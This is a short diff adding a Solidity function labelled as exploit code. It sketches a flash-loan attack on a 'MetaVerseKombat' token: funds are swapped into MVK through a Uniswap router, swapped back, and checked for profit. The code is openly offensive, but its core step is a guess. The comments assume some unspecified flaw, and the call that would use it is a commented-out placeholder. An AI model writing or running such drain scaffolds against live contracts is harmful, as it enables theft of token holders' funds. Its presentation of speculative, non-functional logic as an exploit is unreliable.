@@ -1,0 +1,36 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Approve the contract to spend the flashloan amount
+    valuableToken.approve(address(uniswapRouter), amount);
+
+    // Swap valuableToken for META token (assumed to be MVK)
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(token);
+
+    // Swap tokens
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
+
+    // Interact with MetaVerseKombat contract, call necessary functions to exploit any flaw.
+    // Assume we're creating a liquidity event or something similar to drain tokens.
+
+    // For example, a potential function could be:
+    // callMetaVerseKombatFunction(address(this));
+
+    // Now, quantities of META tokens (MVK) should be increased.
+
+    // Finally, we can swap MVK tokens back to valuableToken
+    uint256 mvkAmount = IERC20(token).balanceOf(address(this));
+    path[0] = address(token);
+    path[1] = address(valuableToken);
+    
+    IERC20(token).approve(address(uniswapRouter), mvkAmount);
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(mvkAmount, 0, path, address(this), block.timestamp);
+
+    // At the end, ensure we have enough valuableToken to pay back the flashloan
+    uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
+    require(finalValuableBalance > amount, "Not enough valuableToken balance to produce profit");
+}
+</executeExploitCode>
+```
